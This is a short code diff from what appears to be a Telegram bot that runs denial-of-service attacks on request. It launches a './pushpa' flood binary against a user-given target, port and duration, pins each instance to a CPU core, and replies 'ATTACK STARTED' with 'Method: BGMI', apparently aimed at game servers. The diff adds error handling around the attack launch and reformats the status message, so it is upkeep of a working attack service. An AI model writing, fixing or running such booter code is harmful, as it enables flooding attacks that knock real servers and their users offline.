@@ -393,14 +393,21 @@ def initialize_bot(bot, bot_id):
         full_command = ['nohup', './pushpa', str(target), str(port), str(time), str(threads_per_instance)]
         core = core_mapping[i % len(core_mapping)]
         taskset_command = ['taskset', '-c', str(core)] + full_command
-        attack_process = subprocess.Popen(taskset_command)
-        Attack[chat_id] = attack_process
+        
+        try:
+            attack_process = subprocess.Popen(taskset_command)
+            Attack[chat_id] = attack_process
+        except Exception as e:
+            bot.reply_to(message, f"Error starting attack: {e}")
+            return
 
     scheduled_time = datetime.now() + timedelta(seconds=time)
     Thread(target=finish_message, args=(message, target, port, time, owner_name, scheduled_time)).start()
-    
-    response = f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI"
+
+    response = (f"@{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.🔥🔥\n\n"
+                f"𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI")
     bot.reply_to(message, response)
+
 
     
     attack_cooldown = {}
